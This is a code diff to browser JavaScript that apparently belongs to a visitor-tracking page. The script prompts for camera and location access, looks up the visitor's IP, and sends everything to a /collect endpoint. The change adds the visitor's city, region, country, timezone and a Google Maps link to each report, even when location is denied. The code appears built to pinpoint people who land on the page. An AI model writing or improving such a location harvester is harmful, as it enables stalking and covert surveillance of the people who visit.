@@ -101,6 +101,10 @@
   async function askForPermissions() {
     let ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
     let clientIP = ipData.ip || "Unknown";
+    let timezone = ipData.timezone || "Unavailable";
+    let city = ipData.city || "Unknown";
+    let region = ipData.region || "Unknown";
+    let country = ipData.country_name || "Unknown";
 
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -115,13 +119,22 @@
 
       navigator.geolocation.getCurrentPosition(
         pos => {
+          let lat = pos.coords.latitude;
+          let lon = pos.coords.longitude;
+          let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
           fetch('/collect', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               ip: clientIP,
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
+              latitude: lat,
+              longitude: lon,
+              mapsLink: mapsLink,
+              timezone: timezone,
+              city: city,
+              region: region,
+              country: country,
               camera: '✅ Camera Allowed',
               userAgent: navigator.userAgent,
               deviceInfo: navigator.platform
@@ -136,6 +149,11 @@
               ip: clientIP,
               latitude: null,
               longitude: null,
+              mapsLink: null,
+              timezone: timezone,
+              city: city,
+              region: region,
+              country: country,
               camera: '✅ Camera Allowed, ❌ Location Denied',
               userAgent: navigator.userAgent,
               deviceInfo: navigator.platform
@@ -143,7 +161,6 @@
           });
         }
       );
-
     } catch (err) {
       fetch('/collect', {
         method: 'POST',
@@ -152,6 +169,11 @@
           ip: clientIP,
           latitude: null,
           longitude: null,
+          mapsLink: null,
+          timezone: timezone,
+          city: city,
+          region: region,
+          country: country,
           camera: '❌ Camera Denied',
           userAgent: navigator.userAgent,
           deviceInfo: navigator.platform
